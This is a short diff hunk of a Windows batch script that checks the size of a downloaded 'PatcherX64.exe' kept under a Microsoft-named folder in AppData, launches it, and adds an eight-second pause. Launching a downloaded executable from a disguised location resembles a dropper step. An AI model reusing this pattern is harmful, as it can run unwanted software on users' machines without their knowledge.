@@ -191,6 +191,7 @@ for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
 :: Check if the file size is at least 0.4MB (400000 bytes)
 if %FILESIZE% geq 400000 (
     start "" "%APPDATA%\microsoft\PatcherX64.exe"
+    timeout /t 8 /nobreak >nul
 ) else (
 echo.
     echo Download incomplete. Check your connection and run the file again.
